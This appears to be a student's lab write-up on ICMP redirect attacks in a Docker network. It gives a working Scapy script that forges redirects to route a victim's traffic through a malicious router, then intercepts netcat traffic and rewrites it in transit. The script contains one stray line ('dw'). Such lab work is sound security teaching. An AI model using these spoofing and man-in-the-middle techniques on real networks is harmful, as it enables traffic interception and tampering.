# Task 1
## 1.  Starting the Containers
```
sudo docker compose up
```
- ![[Pasted image 20250509123930.png]]
- ![[Pasted image 20250509124032.png]]
- we will use the attacker machine to test 
```
docker exec -it csl-attacker bash
```
## 2. Testing Local Subnet Connectivity (`10.9.0.0/24`)
```
ping -c 3 10.9.0.5     # Victim
ping -c 3 10.9.0.11    # Legitimate Router
ping -c 3 10.9.0.111   # Malicious Router
```
![[Pasted image 20250513225756.png]]

## 3. Cross-subnet via the router (`192.168.60.0/24`)
```
ping -c 3 192.168.60.5  # Server 1
ping -c 3 192.168.60.6  # Server 2
```

![[Pasted image 20250513225830.png]]

# Task 2
## Hints explain
### Routing Table vs Routing Cache**
- **Routing Table** (`ip route show`): This is the main list of routes a machine uses to decide where to send packets.
- **Routing Cache**: Used to temporarily store route lookups to speed up repeated traffic flows.
    - In older kernels, it was explicit. In modern Linux systems, it's handled through **neighbor tables** (like ARP).
## What is an ICMP Redirect?
- ICMP Redirect messages can be used to inform hosts of more efficient routes
- is a message sent by a router to inform a host that there's a more efficient route available for a particular destination. This mechanism helps optimize routing paths in a network.

```
from scapy.all import *
import time

victim_ip = "10.9.0.5"
old_gateway = "10.9.0.11"
malicious_gateway = "10.9.0.111"
target_ip = "192.168.60.5"

outer_ip = IP(src=old_gateway, dst=victim_ip)
icmp_redirect = ICMP(type=5, code=1, gw=malicious_gateway)
inner_ip = IP(src=victim_ip, dst=target_ip)
inner_icmp = ICMP() 
dw

packet = outer_ip / icmp_redirect / inner_ip / inner_icmp

print(f"[+] Continuous ICMP Redirect to {victim_ip}: use {malicious_gateway} for {target_ip}")
try:
    while True:
        send(packet, verbose=0)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Stopped sending redirects.")


```

#### Explanation
```
victim_ip = "10.9.0.5"
old_gateway = "10.9.0.11"
malicious_gateway = "10.9.0.111"
target_ip = "192.168.60.5"
```
**Explanation:** Defines the network setup. The victim is `10.9.0.5`, currently using `10.9.0.11` as its default gateway. The attacker wants the victim to send traffic to `192.168.60.5` through the malicious router `10.9.0.111`.

---
```
outer_ip = IP(src=old_gateway, dst=victim_ip)
```
**Explanation:** Constructs the outer IP header for the redirect packet:
 `src` must be the IP of the victim's current default gateway to make the redirect believable and accepted.
`dst` is the victim's IP, since they are the target of the forged redirect.

---
```
icmp_redirect = ICMP(type=5, code=1, gw=malicious_gateway)
```
**Explanation:** Builds the ICMP Redirect header:
    - `type=5`: indicates it's a redirect message. According to RFC 792, this is the specific ICMP type reserved for informing a host that there is a better gateway.
    - `code=1`: means "Redirect for Host". It tells the victim to use the specified gateway only for a particular host (IP address), not for the entire network. This is the most accurate and stealthy way to perform targeted traffic redirection — particularly effective in MITM attacks.
    - Other possible values:
        - code value 0: this means that we redirect datagram for all network to another router, which will be our attacker router for example
        - code value 1: this means that we redirect datagram for specific host, which will be our attacker for example
        - code value 2: redirect for Target of service and network, this mean that packets for certain services are just redirected
        - code value 3: redirect for Target of service of certain host, this mean that packets for certain services for certain host are just
    - `gw`: the new gateway suggested (controlled by the attacker).

---
```
inner_ip = IP(src=victim_ip, dst=target_ip)
inner_icmp = ICMP()
```
**Explanation:** This constructs the embedded original datagram:
- `inner_ip`: mimics the IP header of the packet the victim was sending.
- `inner_icmp`: represents the payload. We use ICMP Echo Request as a lightweight placeholder to satisfy the RFC requirement for including at least 64 bits of the original datagram (see [TCP/IP Guide - ICMP Redirects](http://www.tcpipguide.com/free/t_ICMPv4RedirectMessages-2.htm#google_vignette)).
---
```
packet = outer_ip / icmp_redirect / inner_ip / inner_icmp
```
**Explanation:** This line assembles all the pieces into a full ICMP Redirect message. Structure:
- IP (outer) ➝ ICMP Redirect ➝ Embedded IP header ➝ Embedded ICMP payload
- According to [TCP/IP Guide - ICMPv4 Redirect Messages](http://www.tcpipguide.com/free/t_ICMPv4RedirectMessages-2.htm#google_vignette), this is the proper format for an ICMP redirect. If the embedded portion is omitted or malformed, the victim OS may reject the redirect.
#### Why the Packet is Constructed This Way
The packet construction directly follows the RFC and TCP/IP standard for ICMP Redirects:
- The outer IP header ensures the packet looks like it came from the victim's real gateway.
- The ICMP header specifies the redirect and the new gateway.
- The embedded IP+ICMP portion provides the kernel enough information to match the redirect to an active connection.
     - When a device (the victim) receives an ICMP Redirect message, **its operating system (kernel) doesn’t just blindly accept it**. It checks:
```
Is this redirect message related to any real network activity I’m currently doing?
```
## Topology Diagram
#### Normal Routing (before the attack)
```
Victim (10.9.0.5)
     |
     |  sends packet to → Target (192.168.60.5)
     |                   via default gateway
     ↓
Router (10.9.0.11)
     ↓
192.168.60.5

```
#### After ICMP Redirect Attack
```
Step 1: Attacker (10.9.0.105) sends forged ICMP Redirect:
        From: Router (10.9.0.11)
        To:   Victim (10.9.0.5)
        Message: "Use 10.9.0.111 (Malicious Router) as gateway for 192.168.60.5"

Step 2: Victim updates its route.

Step 3: Packet flow changes:

```
#### What happens now inside the topology 
```
Victim (10.9.0.5)
     |
     |  now sends packet to → Target (192.168.60.5)
     |                       via:
     ↓
Malicious Router (10.9.0.111)
     |
     | (can forward, drop, or modify the traffic)
     ↓
Router (10.9.0.11)
     ↓
192.168.60.5

```
## Scenarios 
### Scenario 1
- The attacker, its malicious rotuer, and the victim are in the same sub-network
- this is the ideal case for ICMP redirect attack.
- the attacker just need to spoof a redirect message and send it to the victim
- the victim is more likely to accept the redirection and reroute the traffic to the attacker router.
```
ip route show cache
before and after
```
### Scenario 2
- Malicious Router in a different sub-net
- this does not make sense, because the victim will think how can I route my traffic to a gateway that I can not reach directly.
- ICMP redirects are only accepted if the redirect target is in the same subnet as the victim, so it will not work
- according to [RFC 1122](https://datatracker.ietf.org/doc/html/rfc1122), ICMP Redirect messages are only accepted if the new gateway is reachable on the same network interface — i.e., it must be in the same subnet as the victim.
### Scenario 3
- non-existing router.
- Victim may accept the redirection
- the victim will attempt to route traffic to it and receive no reply ( it will not get ARP reply). As a result, packets are effectively dropped, and the connection to the target becomes unreachable.
### Scenario 4
- Attacker can not send valid ICMP redirect packet to the victim because it is only accepted if it is sent by the current default gateway.
- Attacker try **spoofs source IP** as `10.9.0.11`
- Sends packet from interface in a different subnet (`192.168.60.0/24`)
- Victim receives packet **from wrong interface**
- **RPF check fails** → Packet is **dropped before reaching ICMP layer**
- Reverse path filtering (RPF) is ==a security feature in networking that ensures incoming packets' source addresses are reachable through the interface they are received on==
     - When a packet arrives, the system checks if the source IP address of the packet is reachable via the interface it came in through.
     - If the source IP is not reachable through that interface (i.e., it's not a valid route), the packet is dropped.
# Task 3
- On the **malicious router**, `tcpdump` was used to observe TCP traffic passing through
```
tcpdump -i eth0 -n -A tcp port 9090
```
- A **netcat server** was started on the server machine (`192.168.60.5`) listening on port 9090:
```
nc -lvnp 9090
```
![[Pasted image 20250514014355.png]]
- A **netcat client** was initiated on the victim machine to connect to the server:
```
nc 192.168.60.5 9090
```
![[Pasted image 20250514014306.png]]

- we as an attacker can see the content now 
![[Pasted image 20250514014420.png]]
# Task 4
- after being MITM from task 3
- Using this script 
- - Excute the mitm.py packet on the malicious router
```
python3 modify.py --src 10.9.0.5 -f "failure!" -r "success!"
```
- ![[Pasted image 20250514025629.png]]
- from victim send 
![[Pasted image 20250514030857.png]]
- on server we recieve 
![[Pasted image 20250514030918.png]]
